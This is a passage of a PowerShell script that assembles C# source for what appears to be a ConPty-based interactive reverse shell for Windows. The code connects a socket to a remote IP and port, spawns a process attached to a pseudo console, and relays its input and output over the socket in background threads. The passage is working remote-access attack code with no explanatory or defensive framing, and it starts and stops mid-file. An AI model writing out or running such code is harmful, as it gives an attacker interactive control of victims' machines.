	"$source2 += \"    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = `\"CreateProcess`\")]`n\"\n",
	"$source2 += \"    [return: MarshalAs(UnmanagedType.Bool)]`n\"\n",
	"$source2 += \"    private static extern bool CreateProcessEx(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = `\"CreateProcess`\")]`n\"\n",
	"$source2 += \"    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    [return: MarshalAs(UnmanagedType.Bool)]`n\"\n",
	"$source2 += \"    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern IntPtr GetStdHandle(int nStdHandle);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool CloseHandle(IntPtr hObject);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern int ClosePseudoConsole(IntPtr hPC);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\")]`n\"\n",
	"$source2 += \"    [return: MarshalAs(UnmanagedType.Bool)]`n\"\n",
	"$source2 += \"    private static extern bool AllocConsole();`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true, ExactSpelling = true)]`n\"\n",
	"$source2 += \"    private static extern bool FreeConsole();`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"user32.dll`\")]`n\"\n",
	"$source2 += \"    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\")]`n\"\n",
	"$source2 += \"    private static extern IntPtr GetConsoleWindow();`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", CharSet = CharSet.Auto)]`n\"\n",
	"$source2 += \"    private static extern IntPtr GetModuleHandle(string lpModuleName);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32`\", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Ansi, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern ushort htons(ushort hostshort);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Ansi, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern uint inet_addr(string cp);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Auto)]`n\"\n",
	"$source2 += \"    private static extern Int32 WSAGetLastError();`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Unicode, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern int closesocket(IntPtr s);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern int recv(IntPtr Socket, byte[] buf, int len, uint flags);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"WS2_32.DLL`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern IntPtr WSACreateEvent();`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"WS2_32.DLL`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern int WSAEventSelect(IntPtr s, IntPtr hEventObject, int lNetworkEvents);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"WS2_32.DLL`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern int WSAWaitForMultipleEvents(int cEvents, IntPtr[] lphEvents, bool fWaitAll, int dwTimeout, bool fAlertable);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"WS2_32.DLL`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool WSAResetEvent(IntPtr hEvent);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"WS2_32.DLL`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source2 += \"    private static extern bool WSACloseEvent(IntPtr hEvent);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ntdll.dll`\")]`n\"\n",
	"$source2 += \"    private static extern uint NtSuspendProcess(IntPtr processHandle);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"ntdll.dll`\")]`n\"\n",
	"$source2 += \"    private static extern uint NtResumeProcess(IntPtr processHandle);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void InitWSAThread()`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        WSAData data;`n\"\n",
	"$source2 += \"        if (WSAStartup(2 << 8 | 2, out data) != 0)`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(String.Format(`\"WSAStartup failed with error code: {0}`\", WSAGetLastError()));`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static IntPtr connectRemote(string remoteIp, int remotePort)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        int port = 0;`n\"\n",
	"$source2 += \"        int error = 0;`n\"\n",
	"$source2 += \"        string host = remoteIp;`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        try`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            port = Convert.ToInt32(remotePort);`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        catch`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Specified port is invalid: `\" + remotePort.ToString());`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        IntPtr socket = IntPtr.Zero;`n\"\n",
	"$source2 += \"        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);`n\"\n",
	"$source2 += \"        SOCKADDR_IN sockinfo = new SOCKADDR_IN();`n\"\n",
	"$source2 += \"        sockinfo.sin_family = (short)2;`n\"\n",
	"$source2 += \"        sockinfo.sin_addr = inet_addr(host);`n\"\n",
	"$source2 += \"        sockinfo.sin_port = (short)htons((ushort)port);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            error = WSAGetLastError();`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(String.Format(`\"WSAConnect failed with error code: {0}`\", error));`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        return socket;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        Thread.Sleep(500);//little tweak for slower connections`n\"\n",
	"$source2 += \"        byte[] received = new byte[100];`n\"\n",
	"$source2 += \"        int rowsTemp, colsTemp;`n\"\n",
	"$source2 += \"        int bytesReceived = recv(shellSocket, received, 100, 0);`n\"\n",
	"$source2 += \"        try`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);`n\"\n",
	"$source2 += \"            string rowsString = sizeReceived.Split(`' `')[0].Trim();`n\"\n",
	"$source2 += \"            string colsString = sizeReceived.Split(`' `')[1].Trim();`n\"\n",
	"$source2 += \"            if (Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp))`n\"\n",
	"$source2 += \"            {`n\"\n",
	"$source2 += \"                rows = (uint)rowsTemp;`n\"\n",
	"$source2 += \"                cols = (uint)colsTemp;`n\"\n",
	"$source2 += \"            }`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        catch`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            return;`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();`n\"\n",
	"$source2 += \"        pSec.nLength = Marshal.SizeOf(pSec);`n\"\n",
	"$source2 += \"        pSec.bInheritHandle = 1;`n\"\n",
	"$source2 += \"        pSec.lpSecurityDescriptor = IntPtr.Zero;`n\"\n",
	"$source2 += \"        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Could not create the InputPipe`\");`n\"\n",
	"$source2 += \"        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Could not create the OutputPipe`\");`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);`n\"\n",
	"$source2 += \"        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);`n\"\n",
	"$source2 += \"        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);`n\"\n",
	"$source2 += \"        Console.WriteLine(`\"Type GENERIC_READ: `\" + GENERIC_READ.GetType());`n\"\n",
	"$source2 += \"        Console.WriteLine(`\"Type FILE_SHARE_READ: `\" + FILE_SHARE_READ.GetType());`n\"\n",
	"$source2 += \"        Console.WriteLine(`\"Type OPEN_EXISTING: `\" + OPEN_EXISTING.GetType());`n\"\n",
	"$source2 += \"        Console.WriteLine(`\"Type FILE_ATTRIBUTE_NORMAL: `\" + FILE_ATTRIBUTE_NORMAL.GetType());`n\"\n",
	"$source2 += \"        IntPtr hStdout = CreateFile(`\"CONOUT$`\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);`n\"\n",
	"$source2 += \"        IntPtr hStdin  = CreateFile(`\"CONIN$`\",  GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);`n\"\n",
	"$source2 += \"        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);`n\"\n",
	"$source2 += \"        SetStdHandle(STD_ERROR_HANDLE, hStdout);`n\"\n",
	"$source2 += \"        SetStdHandle(STD_INPUT_HANDLE, hStdin);`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);`n\"\n",
	"$source2 += \"        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);`n\"\n",
	"$source2 += \"        SetStdHandle(STD_INPUT_HANDLE, oldStdIn);`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void EnableVirtualTerminalSequenceProcessing()`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        uint outConsoleMode = 0;`n\"\n",
	"$source2 += \"        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);`n\"\n",
	"$source2 += \"        if (!GetConsoleMode(hStdOut, out outConsoleMode))`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Could not get console mode`\");`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;`n\"\n",
	"$source2 += \"        if (!SetConsoleMode(hStdOut, outConsoleMode))`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Could not enable virtual terminal processing`\");`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        int result = -1;`n\"\n",
	"$source2 += \"        EnableVirtualTerminalSequenceProcessing();`n\"\n",
	"$source2 += \"        COORD consoleCoord = new COORD();`n\"\n",
	"$source2 += \"        consoleCoord.X = (short)cols;`n\"\n",
	"$source2 += \"        consoleCoord.Y = (short)rows;`n\"\n",
	"$source2 += \"        result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);`n\"\n",
	"$source2 += \"        return result;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        IntPtr lpSize = IntPtr.Zero;`n\"\n",
	"$source2 += \"        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);`n\"\n",
	"$source2 += \"        if (success || lpSize == IntPtr.Zero)`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Could not calculate the number of bytes for the attribute list. `\" + Marshal.GetLastWin32Error());`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        STARTUPINFOEX startupInfo = new STARTUPINFOEX();`n\"\n",
	"$source2 += \"        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);`n\"\n",
	"$source2 += \"        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);`n\"\n",
	"$source2 += \"        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);`n\"\n",
	"$source2 += \"        if (!success)`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Could not set up attribute list. `\" + Marshal.GetLastWin32Error());`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);`n\"\n",
	"$source2 += \"        if (!success)`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Could not set pseudoconsole thread attribute. `\" + Marshal.GetLastWin32Error());`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        return startupInfo;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();`n\"\n",
	"$source2 += \"        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();`n\"\n",
	"$source2 += \"        int securityAttributeSize = Marshal.SizeOf(pSec);`n\"\n",
	"$source2 += \"        pSec.nLength = securityAttributeSize;`n\"\n",
	"$source2 += \"        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();`n\"\n",
	"$source2 += \"        tSec.nLength = securityAttributeSize;`n\"\n",
	"$source2 += \"        bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);`n\"\n",
	"$source2 += \"        if (!success)`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"Could not create process. `\" + Marshal.GetLastWin32Error());`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        return pInfo;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);`n\"\n",
	"$source2 += \"        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);`n\"\n",
	"$source2 += \"        return processInfo;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void ThreadReadPipeWriteSocketOverlapped(object threadParams)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        object[] threadParameters = (object[])threadParams;`n\"\n",
	"$source2 += \"        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];`n\"\n",
	"$source2 += \"        IntPtr shellSocket = (IntPtr)threadParameters[1];`n\"\n",
	"$source2 += \"        int bufferSize = 8192;`n\"\n",
	"$source2 += \"        bool readSuccess = false;`n\"\n",
	"$source2 += \"        Int32 bytesSent = 0;`n\"\n",
	"$source2 += \"        uint dwBytesRead = 0;`n\"\n",
	"$source2 += \"        do`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            byte[] bytesToWrite = new byte[bufferSize];`n\"\n",
	"$source2 += \"            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);`n\"\n",
	"$source2 += \"            bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);`n\"\n",
	"$source2 += \"        } while (bytesSent > 0 && readSuccess);`n\"\n",
	"$source2 += \"        // Console.WriteLine(`\"debug: bytesSent = `\" + bytesSent + `\" WSAGetLastError() = `\" + WSAGetLastError().ToString());`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void ThreadReadPipeWriteSocketNonOverlapped(object threadParams)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        object[] threadParameters = (object[])threadParams;`n\"\n",
	"$source2 += \"        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];`n\"\n",
	"$source2 += \"        IntPtr shellSocket = (IntPtr)threadParameters[1];`n\"\n",
	"$source2 += \"        int bufferSize = 8192;`n\"\n",
	"$source2 += \"        bool readSuccess = false;`n\"\n",
	"$source2 += \"        Int32 bytesSent = 0;`n\"\n",
	"$source2 += \"        uint dwBytesRead = 0;`n\"\n",
	"$source2 += \"        do`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            byte[] bytesToWrite = new byte[bufferSize];`n\"\n",
	"$source2 += \"            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);`n\"\n",
	"$source2 += \"            // Console.WriteLine(`\"debug ThreadReadPipeWriteSocket ReadFile: dwBytesRead = `\" + dwBytesRead + `\" Marshal.GetLastWin32Error() `\" + Marshal.GetLastWin32Error());`n\"\n",
	"$source2 += \"            do`n\"\n",
	"$source2 += \"            {`n\"\n",
	"$source2 += \"                bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);`n\"\n",
	"$source2 += \"                // Console.WriteLine(`\"debug ThreadReadPipeWriteSocket send: bytesSent = `\" + bytesSent + `\" WSAGetLastError() = `\" + WSAGetLastError().ToString());`n\"\n",
	"$source2 += \"            } while (WSAGetLastError() == WSAEWOULDBLOCK);`n\"\n",
	"$source2 += \"        } while (bytesSent > 0 && readSuccess);`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket, bool overlappedSocket)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        object[] threadParameters = new object[2];`n\"\n",
	"$source2 += \"        threadParameters[0] = OutputPipeRead;`n\"\n",
	"$source2 += \"        threadParameters[1] = shellSocket;`n\"\n",
	"$source2 += \"        Thread thThreadReadPipeWriteSocket;`n\"\n",
	"$source2 += \"        if(overlappedSocket)`n\"\n",
	"$source2 += \"            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);`n\"\n",
	"$source2 += \"        else`n\"\n",
	"$source2 += \"            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);`n\"\n",
	"$source2 += \"        thThreadReadPipeWriteSocket.Start(threadParameters);`n\"\n",
	"$source2 += \"        return thThreadReadPipeWriteSocket;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void ThreadReadSocketWritePipeOverlapped(object threadParams)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        object[] threadParameters = (object[])threadParams;`n\"\n",
	"$source2 += \"        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];`n\"\n",
	"$source2 += \"        IntPtr shellSocket = (IntPtr)threadParameters[1];`n\"\n",
	"$source2 += \"        IntPtr hChildProcess = (IntPtr)threadParameters[2];`n\"\n",
	"$source2 += \"        int bufferSize = 8192;`n\"\n",
	"$source2 += \"        bool writeSuccess = false;`n\"\n",
	"$source2 += \"        Int32 nBytesReceived = 0;`n\"\n",
	"$source2 += \"        uint bytesWritten = 0;`n\"\n",
	"$source2 += \"        do`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            byte[] bytesReceived = new byte[bufferSize];`n\"\n",
	"$source2 += \"            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);`n\"\n",
	"$source2 += \"            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);`n\"\n",
	"$source2 += \"        } while (nBytesReceived > 0 && writeSuccess);`n\"\n",
	"$source2 += \"        //  Console.WriteLine(`\"debug: nBytesReceived = `\" + nBytesReceived + `\" WSAGetLastError() = `\" + WSAGetLastError().ToString());`n\"\n",
	"$source2 += \"        TerminateProcess(hChildProcess, 0);`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static void ThreadReadSocketWritePipeNonOverlapped(object threadParams)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        object[] threadParameters = (object[])threadParams;`n\"\n",
	"$source2 += \"        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];`n\"\n",
	"$source2 += \"        IntPtr shellSocket = (IntPtr)threadParameters[1];`n\"\n",
	"$source2 += \"        IntPtr hChildProcess = (IntPtr)threadParameters[2];`n\"\n",
	"$source2 += \"        int bufferSize = 8192;`n\"\n",
	"$source2 += \"        bool writeSuccess = false;`n\"\n",
	"$source2 += \"        Int32 nBytesReceived = 0;`n\"\n",
	"$source2 += \"        uint bytesWritten = 0;`n\"\n",
	"$source2 += \"        bool socketBlockingOperation = false;`n\"\n",
	"$source2 += \"        IntPtr wsaReadEvent = WSACreateEvent();`n\"\n",
	"$source2 += \"        // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data`n\"\n",
	"$source2 += \"        WSAEventSelect(shellSocket, wsaReadEvent, FD_READ);`n\"\n",
